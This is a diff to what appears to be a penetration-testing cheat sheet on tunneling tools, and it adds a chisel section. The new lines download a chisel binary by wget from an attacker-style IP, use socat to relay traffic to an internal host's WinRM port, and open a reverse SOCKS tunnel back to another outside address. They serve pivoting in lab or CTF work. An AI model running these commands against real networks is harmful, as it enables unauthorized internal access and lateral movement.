@@ -510,7 +510,15 @@ token = frp123
 # frpc
 .\frpc tcp  -s "127.0.0.1:7000" -t frp123 -i "127.0.0.1" -l "2125"
 ```
-
+## chisel
+```sh
+wget http://10.10.16.5/chisel_1.9.1_linux
+./socat tcp-listen:60218,reuseaddr,fork tcp:192.168.122.228:5985 &
+./chisel_1.9.1_linux_amd64 server -p 8000 --reverse
+./chisel_1.9.1_linux_amd64 client 10.10.14.39:8001 R:socks
+./socat tcp-listen:55555,reuseaddr,fork tcp:192.168.122.228:5985
+socat tcp-listen:5985,reuseaddr,fork tcp:10.10.16.5:55555
+```
 ## goproxy
 
 ```shell
